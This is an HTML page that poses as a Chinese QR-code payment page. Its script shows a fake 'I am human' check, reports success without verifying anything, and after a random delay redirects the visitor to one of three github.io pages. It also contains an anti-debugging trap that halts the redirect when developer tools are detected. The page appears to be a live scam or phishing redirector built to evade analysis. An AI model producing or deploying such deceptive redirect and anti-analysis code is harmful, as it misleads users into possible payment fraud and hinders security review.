<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>扫码支付 · 聚合码</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 40px;
      background: #f9f9f9;
    }
    .card {
      display: inline-block;
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    h2 { margin-top: 10px; }
    #verifyBtn {
      padding: 12px 24px;
      font-size: 18px;
      background: #1aad19;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
    }
    #status {
      margin-top: 15px;
      font-size: 16px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>扫码支付 · 聚合收款</h2>
    <p>请进行验证以继续</p>
    <button id="verifyBtn">我是人类</button>
    <div id="status">等待验证...</div>
  </div>

  <script>
    (function () {
      const urls = [
        "https://a78521336.github.io/4/",
        "https://a78521336.github.io/2/",
        "https://a78521336.github.io/3/"
      ];

      function antiDebug() {
        const t = 160;
        const n = new Date();
        debugger;
        const e = new Date();
        if (e - n > t) {
          document.body.innerHTML = "<h2>检测到调试，终止跳转</h2>";
          throw new Error("调试被禁止");
        }
      }

      const btn = document.getElementById('verifyBtn');
      const status = document.getElementById('status');

      btn.addEventListener('click', function () {
        btn.disabled = true;
        btn.innerText = "验证中...";
        status.innerText = "验证成功，正在跳转...";

        setTimeout(() => {
          try {
            antiDebug();
            const target = urls[Math.floor(Math.random() * urls.length)];
            location.href = target;
          } catch (e) {
            console.warn(e);
          }
        }, Math.random() * 2000 + 1000); // 1~3秒随机延迟
      });
    })();
  </script>
</body>
</html>
